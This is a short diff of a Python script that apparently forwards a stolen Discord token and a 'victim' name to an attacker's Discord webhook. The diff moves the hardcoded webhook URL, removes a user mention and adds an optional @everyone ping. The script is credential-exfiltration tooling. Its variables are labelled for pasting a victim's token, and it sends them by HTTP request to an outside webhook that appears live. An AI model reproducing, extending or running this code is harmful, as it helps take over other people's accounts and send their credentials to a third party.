@@ -1,5 +1,7 @@
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1044767203930673265/g0DQ-Uenxd5PyaNW0yKQn1abi3wcbK5nfM-cBT0YGjLUBXjb-53D28lekTNqVmh_ORs'
 Token = 'PASTE TOKEN HERE'
 Victim = 'PASTE VICTIM NAME HERE'
+ping = False
 
 # https://trinket.io/embed/python3
 
@@ -9,11 +11,11 @@ import json
 
 from urllib.request import Request, urlopen
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1044767203930673265/g0DQ-Uenxd5PyaNW0yKQn1abi3wcbK5nfM-cBT0YGjLUBXjb-53D28lekTNqVmh_ORsT'
-
 def main():
 
-    message = '<@604711228199141378> \nToken: \n``' + Token + "``\nVictim Name: \n``" + Victim + "``"
+    message = ' \nToken: \n``' + Token + "``\nVictim Name: \n``" + Victim + "``"
+    if ping==True:
+      message += '\n\n@everyone'
     
     headers = {
         'Content-Type': 'application/json',
